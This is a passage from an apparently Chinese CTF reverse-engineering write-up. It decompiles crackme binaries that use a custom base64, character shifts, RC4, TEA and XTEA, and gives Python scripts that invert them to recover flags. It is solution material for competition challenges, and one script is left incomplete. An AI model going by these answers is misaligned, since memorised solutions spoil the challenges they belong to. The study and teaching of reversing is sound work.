*)sub_401500(Str, v3);      <span class="comment">//v11 = 输入字符串的base64编码（自定义码表）</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="built_in">strlen</span>(v11) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v7[i] = v11[i];                             <span class="comment">//v7 = v11</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&quot;</span>);</span><br><span class="line">                                                <span class="comment">//v8 = WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc</span></span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  sub_40167D(v7);                               <span class="comment">//对v7做第一次处理，函数sub_40167D()</span></span><br><span class="line">  sub_401746(v7);                               <span class="comment">//对v7做第二次处理，函数sub_401746()</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = j;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= <span class="built_in">strlen</span>(v7) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7[j] != v8[j] )                       <span class="comment">//比较v7 == v8？</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;ppap&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yes, you are right&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_40167D()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_40167D</span><span class="params">(<span class="keyword">char</span> *Str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">64</span> || Str[i] &gt; <span class="number">90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">96</span> || Str[i] &gt; <span class="number">122</span> )</span><br><span class="line">        Str[i] = Str[i];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        Str[i] -= <span class="number">32</span>;                         <span class="comment">//96&lt;字符ascii值&lt;=122，字符移位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] += <span class="number">32</span>;                           <span class="comment">//64&lt;字符ascii值&lt;=90，字符移位</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_401746()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_401746</span><span class="params">(<span class="keyword">char</span> *Str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">64</span> || Str[i] &gt; <span class="number">90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[i] &gt; <span class="number">96</span> &amp;&amp; Str[i] &lt;= <span class="number">122</span> )</span><br><span class="line">        Str[i] = (Str[i] - <span class="number">97</span> + <span class="number">3</span>) % <span class="number">26</span> + <span class="number">97</span>;     <span class="comment">//96&lt;字符ascii值&lt;=122，字符循环移位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] = (Str[i] - <span class="number">65</span> + <span class="number">3</span>) % <span class="number">26</span> + <span class="number">65</span>;       <span class="comment">//64&lt;字符ascii值&lt;=90，字符循环移位</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 <code>v8</code> 字符串先按函数 <code>sub_401746()</code>还原，再按函数 <code>sub_40167D()</code>还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&#x27;</span></span><br><span class="line">s=<span class="built_in">list</span>(s.encode())</span><br><span class="line"></span><br><span class="line">t=[-<span class="number">1</span>]*<span class="built_in">len</span>(s)</span><br><span class="line">tt=[-<span class="number">1</span>]*<span class="built_in">len</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">c=j</span><br><span class="line"><span class="keyword">if</span> c&lt;=<span class="number">64</span> <span class="keyword">or</span> c&gt;<span class="number">90</span>:</span><br><span class="line"><span class="keyword">if</span> c&gt;<span class="number">96</span> <span class="keyword">and</span> c&lt;=<span class="number">122</span>:</span><br><span class="line">c=(c-<span class="number">97</span>+<span class="number">3</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c=(c-<span class="number">65</span>+<span class="number">3</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line"><span class="keyword">if</span> c==s[i]:</span><br><span class="line">t[i]=j</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">c=j</span><br><span class="line"><span class="keyword">if</span> c&lt;=<span class="number">64</span> <span class="keyword">or</span> c&gt;<span class="number">90</span>:</span><br><span class="line"><span class="keyword">if</span> c&lt;=<span class="number">96</span> <span class="keyword">or</span> c&gt;<span class="number">122</span>:</span><br><span class="line">c=c</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c-=<span class="number">32</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c+=<span class="number">32</span></span><br><span class="line"><span class="keyword">if</span> c==t[i]:</span><br><span class="line">tt[i]=j</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(tt))</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密得密文：tCvB2hvXuS77mvZQytf5wwfKzRZezvZUmweMxSN71BZJyub54wfZ</span></span><br><span class="line"><span class="comment">#自定义码表：a-z0-9A-Z+/=</span></span><br></pre></td></tr></table></figure><p>解自定义码表下的base64得flag。</p><p>​    </p><h3 id="ez"><a href="#ez" class="headerlink" title="ez"></a>ez</h3><blockquote><p>Do you like basketball?</p></blockquote><p>IDA，<code>main()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">sub_40E3F0();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Do you like basketball?&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Source);                                            <span class="comment">//输入字符串Source</span></span><br><span class="line"><span class="built_in">strcpy</span>(Destination, Source);                                    <span class="comment">//Dest = Source</span></span><br><span class="line"><span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="keyword">sizeof</span>(v7));</span><br><span class="line"><span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">sub_40235D(Source, v7, <span class="string">&quot;flag&#123;Would_you_like_basketball?&#125;&quot;</span>);     <span class="comment">//函数sub_40235D(Source,out,key) （RC4+base64）</span></span><br><span class="line">v28 = <span class="number">32</span>;</span><br><span class="line">v24[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">v24[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">v24[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">v24[<span class="number">3</span>] = <span class="number">4</span>;                                                     <span class="comment">//v24 = [2,2,3,4]</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;please input your lucky number&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v25 + i);                                        <span class="comment">//输入v25,v26</span></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">1</span>; ++j )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v22 + j);                                        <span class="comment">//输入v22,v23</span></span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">1</span>; ++k )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v20 + k);                                        <span class="comment">//输入v20,v21</span></span><br><span class="line"><span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">1</span>; ++l )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v18 + l);                                        <span class="comment">//输入v18,v19</span></span><br><span class="line">v4[<span class="number">0</span>] = v25;</span><br><span class="line">v4[<span class="number">1</span>] = v26;</span><br><span class="line">v4[<span class="number">2</span>] = v22;</span><br><span class="line">v4[<span class="number">3</span>] = v23;</span><br><span class="line">v4[<span class="number">4</span>] = v20;</span><br><span class="line">v4[<span class="number">5</span>] = v21;</span><br><span class="line">v4[<span class="number">6</span>] = v18;</span><br><span class="line">v4[<span class="number">7</span>] = v19;                                                    <span class="comment">//v4 = [v25,v26,v22,v23,v20,v21,v18,v19]</span></span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">7</span>; ++m )                                      <span class="comment">//对v4冒泡排序（升序）</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">7</span>; n &gt; m; --n )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[n] &lt; v4[n - <span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      v27 = v4[n];</span><br><span class="line">      v4[n] = v4[n - <span class="number">1</span>];</span><br><span class="line">      v4[n - <span class="number">1</span>] = v27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">sub_40152F(&amp;v25, v24);                                          <span class="comment">//函数sub_40152F() （TEA加密）</span></span><br><span class="line">sub_40152F(&amp;v22, v24);                                          <span class="comment">//函数sub_40152F() （TEA加密）</span></span><br><span class="line">sub_4015FD(v28, &amp;v20, v24);                                     <span class="comment">//函数sub_4015FD() （XTEA加密）</span></span><br><span class="line">sub_4015FD(v28, &amp;v18, v24);                                     <span class="comment">//函数sub_4015FD() （XTEA加密）</span></span><br><span class="line"><span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">v9[<span class="number">0</span>] = <span class="number">81</span>;                                                     <span class="comment">//v9</span></span><br><span class="line">v9[<span class="number">1</span>] = <span class="number">116</span>;</span><br><span class="line">......</span><br><span class="line">v9[<span class="number">46</span>] = <span class="number">7</span>;</span><br><span class="line">v9[<span class="number">47</span>] = <span class="number">8</span>;</span><br><span class="line">v16 = <span class="number">-1621115832</span>;                                              <span class="comment">//v10~v17，8个hex</span></span><br><span class="line">v17 = <span class="number">-984516975</span>;</span><br><span class="line">v14 = <span class="number">616429839</span>;</span><br><span class="line">v15 = <span class="number">807110888</span>;</span><br><span class="line">v12 = <span class="number">-1837822886</span>;</span><br><span class="line">v13 = <span class="number">-1596355058</span>;</span><br><span class="line">v10 = <span class="number">-1915738221</span>;</span><br><span class="line">v11 = <span class="number">1331005540</span>;</span><br><span class="line"><span class="keyword">if</span> ( v25 != <span class="number">-1621115832</span>                                         <span class="comment">//v25,v26,v22,v23,v20,v21,v18,v19 == v10~v17</span></span><br><span class="line">  || v26 != v17</span><br><span class="line">  || v14 != v22</span><br><span class="line">  || v15 != v23</span><br><span class="line">  || v12 != v20</span><br><span class="line">  || v13 != v21</span><br><span class="line">  || v10 != v18</span><br><span class="line">  || v11 != v19 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are wrong&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">47</span>; ++ii )</span><br><span class="line">  *(_DWORD *)&amp;v8[<span class="number">4</span> * ii + <span class="number">128</span>] = v4[ii % <span class="number">8</span>] ^ v7[ii];          <span class="comment">//v8 = v4^v7 </span></span><br><span class="line"><span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">47</span>; ++jj )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v9[jj] != *(_DWORD *)&amp;v8[<span class="number">4</span> * jj + <span class="number">128</span>] )                <span class="comment">//v9 == v8？</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Right,FLAG is Neepu&#123;%s&#125;\n&quot;</span>, Destination);</span><br><span class="line">system(<span class="string">&quot;PAUSE&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_40235D(Source,out,key)</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">sub_40235D</span><span class="params">(<span class="keyword">char</span> *Str, <span class="keyword">void</span> *a2, <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *Src; <span class="comment">// [esp+1Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> Size; <span class="comment">// [esp+20h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *Block; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v6; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v7; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( Str &amp;&amp; a2 &amp;&amp; a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    v6 = <span class="built_in">strlen</span>(a3);</span><br><span class="line">    Block = (<span class="keyword">void</span> *)sub_418710(v7 + <span class="number">1</span>);                <span class="comment">//初始化Block</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Block, Str, v7 + <span class="number">1</span>);</span><br><span class="line">    sub_401E22(Block, v7, a3, v6);                     <span class="comment">//RC4加密，Block = RC4(Str,key)</span></span><br><span class="line">    Size = <span class="number">0</span>;</span><br><span class="line">    Src = <span class="number">0</span>;</span><br><span class="line">    sub_4020DE(Block, v7, (<span class="keyword">int</span>)&amp;Src, (<span class="keyword">int</span>)&amp;Size);      <span class="comment">//Src = Block的base64编码（自定义码表）</span></span><br><span class="line">    <span class="keyword">if</span> ( Src )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(a2, Src, Size);                           <span class="comment">//a2 = Src</span></span><br><span class="line">      *((_BYTE *)a2 + Size) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( Src )</span><br><span class="line">        j_j_free(Src);</span><br><span class="line">      Src = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( Block )</span><br><span class="line">      j_j_free(Block);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_40152F()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_40152F</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, _DWORD *a2)</span>        <span class="comment">//TEA加密算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a1;</span><br><span class="line">  v5 = a1[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 -= <span class="number">1640531527</span>;</span><br><span class="line">    v6 += (v5 + v4) ^ (<span class="number">16</span> * v5 + *a2) ^ ((v5 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">1</span>]);</span><br><span class="line">    v5 += (v6 + v4) ^ (<span class="number">16</span> * v6 + a2[<span class="number">2</span>]) ^ ((v6 &gt;&gt; <span class="number">5</span>) + a2[<span class="number">3</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a1[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_4015FD()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_4015FD</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a2, <span class="keyword">int</span> a3)</span>        <span class="comment">//XTEA算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a2;</span><br><span class="line">  v5 = a2[<span class="number">1</span>];</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 += (((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)) + v5) ^ (*(_DWORD *)(<span class="number">4</span> * (v4 &amp; <span class="number">3</span>) + a3) + v4);</span><br><span class="line">    v4 -= <span class="number">1640531527</span>;</span><br><span class="line">    v5 += (((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)) + v6) ^ (*(_DWORD *)(<span class="number">4</span> * ((v4 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>) + a3) + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  *a2 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a2[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据上面逻辑，先利用TEA和XTEA解密算法由 <code>v10~v17</code> 解密得到初始值 <code>v25,v26,v22,v23,v20,v21,v18,v19</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TEA解密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">v, k</span>):</span></span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0xC6EF3720</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    encrypted = </span><br><span class="line">    key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    <span class="built_in">print</span>(decrypted)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 